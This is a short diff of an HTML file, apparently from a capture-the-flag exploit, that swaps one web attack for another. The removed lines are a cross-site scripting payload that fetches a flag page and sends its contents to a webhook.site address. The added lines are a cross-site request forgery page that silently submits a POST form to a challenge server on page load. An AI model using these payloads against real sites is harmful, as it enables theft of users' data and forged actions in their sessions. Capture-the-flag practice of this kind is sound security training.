@@ -1,5 +1,12 @@
-<script>
-  fetch("https://chessbased.chall.lac.tf/render?id=flag")
-    .then(res => res.text())
-    .then(data => fetch("https://webhook.site/e634c6a6-0cb7-4167-93a0-d4e31934f2f8?flag=" + btoa(data)));
-  </script>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF Exploit</title>
+  </head>
+  <body onload="document.getElementById('csrfForm').submit()">
+    <form id="csrfForm" method="POST" action="https://arclbroth-gc4su.instancer.lac.tf/replenish">
+    </form>
+    <p>If you are not redirected automatically, please click the button below.</p>
+    <button type="submit" form="csrfForm">Submit</button>
+  </body>
+</html>
